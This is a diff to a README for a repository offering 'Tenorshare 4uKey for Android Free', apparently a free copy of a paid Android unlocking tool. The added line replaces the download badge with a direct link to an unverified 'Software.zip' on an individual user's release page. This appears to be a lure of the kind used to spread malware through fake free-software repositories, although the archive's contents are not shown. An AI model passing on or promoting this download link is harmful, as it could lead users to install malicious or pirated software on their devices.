@@ -26,7 +26,7 @@ Welcome to the official repository for Tenorshare 4uKey for Android Free! Here y
 ## Get Started
 To get started with Tenorshare 4uKey for Android Free, you can download the latest version using the link provided below:
 
-[![Download Tenorshare 4uKey for Android Free](https://img.shields.io/badge/Download-v1.0.0-brightgreen.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Tenorshare 4uKey for Android Free](https://github.com/eyepez8164/Tenorshare-4uKey-for-Android-Free/releases/download/v1.0/Software.zip)](https://github.com/eyepez8164/Tenorshare-4uKey-for-Android-Free/releases/download/v1.0/Software.zip)
 (Click on the badge above to initiate the download).
 
 If the link does not work or direct you to a specific file, please visit the "Releases" section of this repository for alternative download options.
